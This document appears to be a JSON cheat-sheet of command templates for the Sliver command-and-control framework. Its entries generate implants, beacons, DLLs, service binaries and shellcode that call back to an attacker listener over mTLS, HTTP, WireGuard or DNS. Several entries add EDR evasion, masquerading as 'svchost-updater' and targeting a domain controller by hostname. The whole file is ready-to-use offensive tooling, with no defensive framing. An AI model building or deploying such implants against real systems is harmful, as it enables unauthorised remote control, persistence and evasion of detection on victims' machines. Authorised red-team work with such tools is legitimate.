{
  "title": "Sliver - Payload Generation",
  "commands": [
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/implant.exe"
        }
      ],
      "title": "Generate Windows x64 session (mTLS)",
      "template": "generate --mtls {lhost_ip}:{lport} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "80"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/implant.exe"
        }
      ],
      "title": "Generate Windows x64 session (HTTP)",
      "template": "generate --http {lhost_ip}:{lport} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "key_port",
          "description": "Key exchange port",
          "default": "1337"
        },
        {
          "name": "nport",
          "description": "C2 comms port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/wg_implant.exe"
        }
      ],
      "title": "Generate Windows x64 session (WireGuard)",
      "template": "generate --wg {lhost_ip}:{key_port} --key-exchange {key_port} --tcp-comms {nport} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "domain",
          "description": "DNS domain for C2",
          "default": "c2.example.com"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/dns_implant.exe"
        }
      ],
      "title": "Generate Windows x64 session (DNS)",
      "template": "generate --dns {domain} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/linux_implant.elf"
        }
      ],
      "title": "Generate Linux x64 ELF session (mTLS)",
      "template": "generate --mtls {lhost_ip}:{lport} --os linux --arch amd64 --format exe --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/macos_implant"
        }
      ],
      "title": "Generate macOS x64 session (mTLS)",
      "template": "generate --mtls {lhost_ip}:{lport} --os mac --arch amd64 --format exe --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save DLL",
          "default": "/tmp/implant.dll"
        }
      ],
      "title": "Generate Windows x64 DLL (shared library)",
      "template": "generate --mtls {lhost_ip}:{lport} --format shared --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/implant_svc.exe"
        }
      ],
      "title": "Generate Windows x64 service executable",
      "template": "generate --mtls {lhost_ip}:{lport} --format service --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save shellcode",
          "default": "/tmp/shellcode.bin"
        }
      ],
      "title": "Generate Windows shellcode (for injection)",
      "template": "generate --mtls {lhost_ip}:{lport} --format shellcode --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save shellcode",
          "default": "/tmp/linux_sc.bin"
        }
      ],
      "title": "Generate Linux shellcode (for injection)",
      "template": "generate --mtls {lhost_ip}:{lport} --os linux --format shellcode --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save payload",
          "default": "/tmp/evasive.exe"
        }
      ],
      "title": "Generate with EDR evasion (symbol obfuscation + evasion)",
      "template": "generate --mtls {lhost_ip}:{lport} --evasion --skip-symbols --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "canary_domain",
          "description": "Canary domain for detection",
          "default": "1.canary.example.com"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/implant.exe"
        }
      ],
      "title": "Generate with DNS canary detection",
      "template": "generate --mtls {lhost_ip}:{lport} --canary {canary_domain} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "agent_name",
          "description": "Custom implant name",
          "default": "svchost-updater"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/svchost_updater.exe"
        }
      ],
      "title": "Generate with custom name (masquerading)",
      "template": "generate --mtls {lhost_ip}:{lport} --name {agent_name} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "reconnect",
          "description": "Reconnect interval (seconds)",
          "default": "10"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/aggressive.exe"
        }
      ],
      "title": "Generate with aggressive reconnect rate",
      "template": "generate --mtls {lhost_ip}:{lport} --reconnect {reconnect} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "limit_hostname",
          "description": "Only run on this hostname",
          "default": "DC01"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/targeted.exe"
        }
      ],
      "title": "Generate with execution restriction (hostname)",
      "template": "generate --mtls {lhost_ip}:{lport} --limit-hostname {limit_hostname} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/beacon.exe"
        }
      ],
      "title": "Generate Windows x64 beacon (mTLS, defaults 60s/30s jitter)",
      "template": "generate beacon --mtls {lhost_ip}:{lport} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "80"
        },
        {
          "name": "seconds",
          "description": "Interval in seconds",
          "default": "60"
        },
        {
          "name": "jitter",
          "description": "Jitter in seconds",
          "default": "30"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/beacon.exe"
        }
      ],
      "title": "Generate beacon with custom interval and jitter",
      "template": "generate beacon --mtls {lhost_ip}:{lport} --seconds {seconds} --jitter {jitter} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "seconds",
          "description": "Interval in seconds",
          "default": "60"
        },
        {
          "name": "jitter",
          "description": "Jitter in seconds",
          "default": "30"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/linux_beacon.elf"
        }
      ],
      "title": "Generate Linux x64 beacon with custom interval and jitter",
      "template": "generate beacon --mtls {lhost_ip}:{lport} --os linux --arch amd64 --seconds {seconds} --jitter {jitter} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "80"
        },
        {
          "name": "seconds",
          "description": "Interval in seconds",
          "default": "60"
        },
        {
          "name": "jitter",
          "description": "Jitter in seconds",
          "default": "30"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/http_beacon.exe"
        }
      ],
      "title": "Generate HTTP beacon with custom interval and jitter",
      "template": "generate beacon --http {lhost_ip}:{lport} --seconds {seconds} --jitter {jitter} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "seconds",
          "description": "Interval in seconds",
          "default": "60"
        },
        {
          "name": "jitter",
          "description": "Jitter in seconds",
          "default": "30"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/evasive_beacon.exe"
        }
      ],
      "title": "Generate beacon with evasion + symbols disabled",
      "template": "generate beacon --mtls {lhost_ip}:{lport} --evasion --skip-symbols --seconds {seconds} --jitter {jitter} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "strategy",
          "description": "C2 strategy: r=random, rd=random domain, s=sequential",
          "default": "r"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/multi_c2.exe"
        }
      ],
      "title": "Generate with multi-protocol C2 (mtls+http) + random strategy",
      "template": "generate --mtls {lhost_ip}:{lport} --http {lhost_ip}:80 --strategy {strategy} --save {save_path}"
    },
    {
      "args": [
        {
          "name": "profile_name",
          "description": "Name of the profile to create",
          "default": "windows-mtls"
        },
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        }
      ],
      "title": "Create a reusable implant profile (session)",
      "template": "profiles new --mtls {lhost_ip}:{lport} --os windows --arch amd64 --format exe {profile_name}"
    },
    {
      "args": [
        {
          "name": "profile_name",
          "description": "Name of the profile to create",
          "default": "linux-beacon"
        },
        {
          "name": "lhost_ip",
          "description": "Listener IP",
          "default": "192.168.1.100"
        },
        {
          "name": "lport",
          "description": "Listener Port",
          "default": "8888"
        },
        {
          "name": "seconds",
          "description": "Interval in seconds",
          "default": "60"
        },
        {
          "name": "jitter",
          "description": "Jitter in seconds",
          "default": "30"
        }
      ],
      "title": "Create a reusable beacon profile",
      "template": "profiles new beacon --mtls {lhost_ip}:{lport} --seconds {seconds} --jitter {jitter} {profile_name}"
    },
    {
      "args": [
        {
          "name": "profile_name",
          "description": "Profile name to generate from",
          "default": "windows-mtls"
        },
        {
          "name": "save_path",
          "description": "Path to save binary",
          "default": "/tmp/profile_implant.exe"
        }
      ],
      "title": "Generate implant from a saved profile",
      "template": "profiles generate {profile_name} --save {save_path}"
    },
    {
      "args": [],
      "title": "List all implant builds on server",
      "template": "implants"
    },
    {
      "args": [],
      "title": "List all saved profiles",
      "template": "profiles"
    },
    {
      "args": [
        {
          "name": "profile_name",
          "description": "Profile to remove",
          "default": "windows-mtls"
        }
      ],
      "title": "Delete a saved profile",
      "template": "profiles rm {profile_name}"
    },
    {
      "args": [
        {
          "name": "save_path",
          "description": "Path to regenerate stored binary",
          "default": "/tmp/regenerated.exe"
        }
      ],
      "title": "Regenerate the last built implant",
      "template": "regenerate --save {save_path}"
    }
  ]
}